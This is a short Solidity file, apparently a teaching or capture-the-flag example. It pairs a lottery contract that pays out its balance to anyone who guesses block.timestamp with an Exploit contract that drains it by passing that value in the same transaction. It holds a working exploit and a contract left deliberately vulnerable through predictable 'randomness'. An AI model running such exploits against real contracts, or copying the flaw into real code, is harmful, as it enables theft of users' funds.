pragma solidity 0.8.19;

contract ILuck {
    uint256 public PRICE = 10 ether;
    uint256 public constant ENTRY = 1 ether;

    constructor() payable {
        require(msg.value == PRICE, "price not sent");
    }

    function guess(uint256 val) external payable {
        require(msg.value == ENTRY, "the entry not sent"); 

        require(val == block.timestamp, "incorrect guess");

        payable(msg.sender).transfer(address(this).balance);
    }
}

contract Exploit {
    ILuck luck;
    constructor(address luckAddress) payable {
        luck = ILuck(luckAddress);
    }

    function attack() external {
        luck.guess{value: 1 ether}(block.timestamp);
    }
    
    receive() external payable {}
}
